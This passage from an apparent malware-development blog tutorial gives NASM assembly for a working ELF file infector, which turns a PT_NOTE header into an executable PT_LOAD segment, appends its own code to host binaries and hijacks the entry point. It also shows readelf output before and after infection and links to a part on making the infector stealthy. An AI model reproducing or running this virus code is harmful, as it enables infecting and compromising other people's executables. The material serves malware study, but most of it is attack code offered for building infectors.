</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, <span style="color:#66d9ef">QWORD</span> [rsp <span style="color:#f92672">+</span> inf_filesize]     <span style="color:#75715e">; It starts at the EOF</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rax <span style="color:#f92672">+</span> p_offset], rdx
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rax <span style="color:#f92672">+</span> p_filesz], virus_len   <span style="color:#75715e">; We update the sizes</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rax <span style="color:#f92672">+</span> p_memsz], virus_len
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rax <span style="color:#f92672">+</span> p_align], <span style="color:#ae81ff">0x1000</span>       <span style="color:#75715e">; And the alignement</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, [rsp <span style="color:#f92672">+</span> inf_last_pt_load]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rcx, [rdx <span style="color:#f92672">+</span> p_vaddr]                <span style="color:#75715e">; we get the last page used</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">and</span>     cx, <span style="color:#ae81ff">0xf000</span>                          <span style="color:#75715e">; we align the address on page border</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rcx, [rsp <span style="color:#f92672">+</span> inf_filesize]           <span style="color:#75715e">; and we add the file size to it so that</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e">; it will be on another page and also to keep</span>
</span></span><span style="display:flex;"><span>                                                <span style="color:#75715e">; offset and address consistent</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rax <span style="color:#f92672">+</span> p_vaddr], rcx                <span style="color:#75715e">; We put it after the last address mapped into memory</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rax <span style="color:#f92672">+</span> p_paddr], rcx                <span style="color:#75715e">; but we have to align it on another page</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span>     rax, [rsp <span style="color:#f92672">+</span> inf_map]                <span style="color:#75715e">; We convert our infected segment&#39;s address to</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> inf_notehdr], rax            <span style="color:#75715e">; an offset in case remapping changes the map address</span>
</span></span></code></pre></div><p>This is the code that will handle the <code>PT_NOTE</code> hijacking. If we want our program to execute, we need the new <code>PT_LOAD</code> header to be valid so we will have to change a lot of its fields.</p>
<ul>
<li><code>p_type</code>: We will switch it from <code>PT_NOTE</code> to <code>PT_LOAD</code> to tell the system that we want to map our code into the memory.</li>
<li><code>p_flags</code>: For <code>PT_LOAD</code> segments, this field is used to define the permissions that will be granted to our segment. We will give it read and execute permissions because that&rsquo;s all ot needs.</li>
<li><code>p_offset</code>: This field defines here the segment starts, since we are gonna put our code at the end of the file, we will put the file size value here.</li>
<li><code>p_file/memsz</code>: Those are used to tell the system the place it needs to reserve in memory and how many bytes of the file it has to put in. We will define both as the virus length (We will see how to get it later)</li>
<li><code>p_p/vaddr</code>: Those are the physical and virtual addresses where the segment will be mapped. It is said in the man that <code>Loadable process segments must have congruent values for p_vaddr and p_offset, modulo the page size.</code> so we will take the page right after the last already existing <code>PT_LOAD</code> and then add it the file size so that we are sure that he offset and addresses values have congruent values.</li>
<li><code>p_align</code>: Loadable segments are aligned on memory pages so we will change it to the usual size of a page (0x1000 bytes)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>adjust_file_size:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp <span style="color:#f92672">+</span> inf_fd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, [rsp <span style="color:#f92672">+</span> inf_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rsi, virus_len
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [rsp <span style="color:#f92672">+</span> inf_new_filesize], rsi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_FTRUNCATE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    eax, eax
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jnz</span>     munmap_quit_infect
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdi, [rsp <span style="color:#f92672">+</span> inf_map]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, [rsp <span style="color:#f92672">+</span> inf_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, [rsp <span style="color:#f92672">+</span> inf_new_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     r10, r10
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     r10b, MREMAP_MAYMOVE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_MREMAP
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">test</span>    al, al
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">jnz</span>     munmap_quit_infect
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     [rsp <span style="color:#f92672">+</span> inf_map], rax            <span style="color:#75715e">; This might break the reference to the phdrs</span>
</span></span><span style="display:flex;"><span>                                            <span style="color:#75715e">; but they are not needed anymore</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdi, [rsp <span style="color:#f92672">+</span> inf_map]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rdi, [rsp <span style="color:#f92672">+</span> inf_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lea</span>     rsi, [rel _start]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rcx, virus_len
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>copy_payload:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">lodsb</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">stosb</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">loop</span>    copy_payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>patch_entrypoint:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     r8, [rsp <span style="color:#f92672">+</span> inf_map]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rax, r8
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rax, [rsp <span style="color:#f92672">+</span> inf_notehdr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdx, [r8 <span style="color:#f92672">+</span> e_entry]          <span style="color:#75715e">; We save the old entrypoint</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rcx, [rax <span style="color:#f92672">+</span> p_vaddr]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">QWORD</span> [r8 <span style="color:#f92672">+</span> e_entry], rcx    <span style="color:#75715e">; We change the entrypoint to our code</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rcx, final_jmp_offset        <span style="color:#75715e">; The address to patch</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sub</span>     rdx, rcx                     <span style="color:#75715e">; We have the relative jump</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rcx, [rax <span style="color:#f92672">+</span> p_offset]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rcx, r8
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">add</span>     rcx, final_jmp_offset <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>    <span style="color:#75715e">; The file offset of the address to patch</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     <span style="color:#66d9ef">DWORD</span> [rcx], edx             <span style="color:#75715e">; We return to the original entrypoint</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>munmap_quit_infect:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdi, [rsp <span style="color:#f92672">+</span> inf_map]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, [rsp <span style="color:#f92672">+</span> inf_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_MSYNC
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rdi, [rsp <span style="color:#f92672">+</span> inf_map]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     rsi, [rsp <span style="color:#f92672">+</span> inf_filesize]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_MUNMAP
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>close_quit_infect:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     edi, [rsp <span style="color:#f92672">+</span> inf_fd]
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_CLOSE
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>quit_infect:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">leave</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">ret</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    signature: <span style="color:#66d9ef">db</span> <span style="color:#ae81ff">0</span>, SIGNATURE, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    dir1: <span style="color:#66d9ef">db</span> <span style="color:#e6db74">&#34;/tmp/test/&#34;</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    dir2: <span style="color:#66d9ef">db</span> <span style="color:#e6db74">&#34;/tmp/test2/&#34;</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    cwd: <span style="color:#66d9ef">db</span> <span style="color:#e6db74">&#34;.&#34;</span>, <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>_end:
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">xor</span>     rdi, rdi
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">mov</span>     eax, SYS_EXIT
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">syscall</span>
</span></span></code></pre></div><p>Once our new segment has been created, it is time to put the code inside the file. Since we are working with a memory mapped file, we need to remap it to extend it first. Once this has been done, we just go to the previous end of the file and we copy the payload there. To get the size of our payload, we use the <code>_end</code> beacon that we put at the end so that we can define <code>virus_len</code> as <code>_end - _start</code>.</p>
<p>Once our payload has been copied, the last step is to hijack the control flow to get it executed. To do that we will first add the following lines to <code>_start</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-nasm" data-lang="nasm"><span style="display:flex;"><span>    <span style="color:#a6e22e">jmp</span>     _end
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">final_jmp_offset</span><span style="color:#66d9ef"> equ</span> <span style="color:#66d9ef">$</span> <span style="color:#f92672">-</span> _start
</span></span></code></pre></div><p>With this line, the program will cleanly quits after its first execution. We can also use this <code>jmp</code> to jmp back to the original entrypoint after the virus execution. In x86_64 assembly, a jump is encoded as <code>opcode relative_offset</code> starting from the <code>final_jmp_offset</code> label.
We can obtain this offset with the formula : <code>old_entrypoint_address - final_jmp_offset</code>.
Once we replaced the jmp address in the copied code, everything is set but there is still one thing to do for the infector to fully work : preserve its registers.
Indeed, the host program code might expect some special values in some register that we used (like <code>argc</code> and <code>argv</code> in <code>rdi</code> and <code>rsi</code>) so we will push those important registers at the very beginning of our program and pop them just before the final jump.</p>
<h3 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
<p>We can now infect any ELF 64-bits of our system and get anything executed executed by it if we insert a real payload inside but we have a problem : our technique is not stealthy at all, we can be spotted by <code>readelf</code>.</p>
<p><code>readelf</code> is a linux command that allows us to inspect ELF files, we will use it with the <code>-l</code> option to display the program headers of a simple Hello World coded in C before and after infection.</p>
<pre tabindex="0"><code>Elf file type is DYN (Shared object file)
Entry point 0x1050
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
</code></pre><p>This is how a normal file looks like, it has 4 load segments including a single one that is executable for the code and a single one that is writable for the data segment. It also has a NOTE header that is containing notes about the program.</p>
<p>After the infection, it will look more like :</p>
<pre tabindex="0"><code>Elf file type is DYN (Shared object file)
Entry point 0x70e0
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  LOAD           0x00000000000040e0 0x00000000000070e0 0x00000000000070e0
                 0x000000000000038a 0x000000000000038a  R E    0x1000
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
</code></pre><p>We can now see that there is another load segment which has execution permissions. It is super weird and should not be there at all, we can also notice that obviously, the NOTE segment disappeared. Another odd thing is the fact that the entrypoint is pointing on that segment. The code segment is almost always mapped at 0x1000 and the entrypoint is usually at the beginning of it so 0x70e0 definitely doesn&rsquo;t look legit.
This is how you can see that this file is not legitimate and probably infected without even the need to properly analyze it.</p>
<p>Lucky for us, we are gonna learn how to make an infector that will not induce any peculiar change in the ELF file structure. It will keep the original entrypoint and it will not change the number of load segments nor their permissions.</p>
<p><a href="/malware_dev/infector_advanced">Part 2. Advanced infectors: How to make our infector stealthy and hardly detectable</a></p>

      </div></div>

  

  
  

  
</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://alagroy-42.github.io/assets/main.js"></script>
<script src="https://alagroy-42.github.io/assets/prism.js"></script>







  
</div>

</body>
</html>
